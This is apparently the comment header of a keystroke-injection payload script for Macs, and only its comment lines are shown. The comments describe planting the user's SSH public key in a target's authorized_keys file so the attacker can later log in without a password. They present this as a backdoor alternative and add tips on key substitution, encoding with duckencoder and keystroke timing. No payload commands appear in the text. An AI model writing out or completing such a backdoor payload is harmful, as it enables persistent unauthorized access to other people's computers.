REM This script adds an ssh public key to the authorized_keys file on a target's mac. After running you can connect to the target computer with ssh targetuser@targetcomputer and you will be granted access without a password. This a good alternative to the OS X User Backdoor payload. For more information on generating an id_rsa.pub read this (steps 1 & 2). Note: I reccomend you use duckencoder 2.6.3 to encode these payloads.
REM Replace RSA_PUB_ID with your SSH Public Key.

REM Note: you may shorten the times if you think they are too slow.  I made them to accomodate older macs that can't get around very fast.
